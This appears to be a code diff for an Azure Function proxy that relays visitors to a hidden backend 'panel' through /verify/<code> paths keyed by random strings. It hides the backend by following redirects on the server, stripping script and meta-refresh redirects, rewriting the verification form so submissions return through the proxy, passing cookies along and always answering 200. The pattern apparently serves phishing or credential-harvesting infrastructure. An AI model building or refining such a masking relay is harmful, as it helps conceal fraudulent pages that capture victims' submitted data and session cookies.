@@ -6,25 +6,31 @@ module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
     
-    // Remove the proxy prefix if it exists (e.g. /api/proxy)
+    // 1. Remove the proxy prefix if it exists
     path = path.replace(/^\/api\/proxy/, '');
-
-    const parts = path.split('/').filter(Boolean);
-    let originalRandomString = '';
-
-    // 🚨 SMART ROUTING 🚨
-    if (parts.length === 2 && parts[0] !== 'api' && parts[1].length > 4) {
-        originalRandomString = parts[0];
-        path = `/verify/${parts[1]}`;
-    } else if (parts.length === 1 && parts[0].length > 4) {
-        path = `/verify/${parts[0]}`;
-    }
-
     if (!path.startsWith('/')) path = '/' + path;
 
+    // 2. Add query strings
     if (req.query && Object.keys(req.query).length > 0) {
         const qs = new URLSearchParams(req.query).toString();
         if (!path.includes('?')) path += '?' + qs;
+    }
+
+    // Ignore Cloudflare internal paths
+    if (path.startsWith('/cdn-cgi/')) {
+        context.res = { status: 404, body: '' };
+        return;
+    }
+
+    // 3. SMART ROUTING (Extract the code and the random string)
+    const parts = path.split('/').filter(Boolean);
+    let originalRandomString = '';
+    
+    if (parts.length === 2 && parts[0] !== 'api' && parts[1].length > 4) {
+        originalRandomString = parts[0]; // e.g., "bc29429fe8ed"
+        path = `/verify/${parts[1]}`;    // e.g., "M7OCTS"
+    } else if (parts.length === 1 && parts[0].length > 4) {
+        path = `/verify/${parts[0]}`;
     }
 
     context.log(`Forwarding ${req.method} to: ${path}`);
@@ -48,6 +54,7 @@ module.exports = async function (context, req) {
         let currentUrl = `https://${PANEL}${path}`;
         let r;
 
+        // 4. FOLLOW HTTP REDIRECTS SERVER-SIDE (Stops the URL from changing)
         for (let hop = 0; hop < 5; hop++) {
             r = await fetch(currentUrl, {
                 method: req.method,
@@ -70,8 +77,9 @@ module.exports = async function (context, req) {
         let responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
 
+        // 5. STRIP JS REDIRECTS AND FIX FORM ACTION
         if (contentType.includes('text/html')) {
-            // Strip JS redirects
+            // Delete scripts that force a window.location change
             responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                 if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                     return ''; 
@@ -80,10 +88,12 @@ module.exports = async function (context, req) {
             });
             responseBody = responseBody.replace(/window\.location(\.[a-zA-Z]+)?\s*=\s*['"][^'"]+['"];?/gi, '');
             responseBody = responseBody.replace(/window\.location\.(replace|assign)\(['"][^'"]+['"]\);?/gi, '');
+            responseBody = responseBody.replace(/<meta[^>]*http-equiv=["']?refresh["']?[^>]*>/gi, '');
 
-            // 🚨 FIX THE FORM ACTION FOR THE BROWSER 🚨
-            // If the panel returns a form with action="/api/proxy/...", ensure the browser submits to it properly
-            responseBody = responseBody.replace(/action="\/verify\/([^"]+)"/gi, `action="/api/proxy/${originalRandomString}/$1"`);
+            // Rewrite the form action so POSTs go to the API proxy instead of directly to /verify/
+            // This forces Azure to accept the POST request
+            responseBody = responseBody.replace(/action=["']\/verify\/([^"']+)["']/gi, `action="/api/proxy/${originalRandomString}/$1"`);
+            responseBody = responseBody.replace(/<form method="POST" id="verifyForm"/gi, `<form action="/api/proxy/${originalRandomString}/x" method="POST" id="verifyForm"`);
         }
 
         const respHeaders = {
@@ -97,7 +107,7 @@ module.exports = async function (context, req) {
         const setCookie = r.headers.get('set-cookie');
         if (setCookie) respHeaders['Set-Cookie'] = setCookie;
 
-        // ALWAYS return 200 to stop the browser from redirecting
+        // Always return 200 to the browser so it doesn't try to redirect
         context.res = { status: 200, headers: respHeaders, body: responseBody };
     } catch (e) {
         context.log('Error:', e.message);
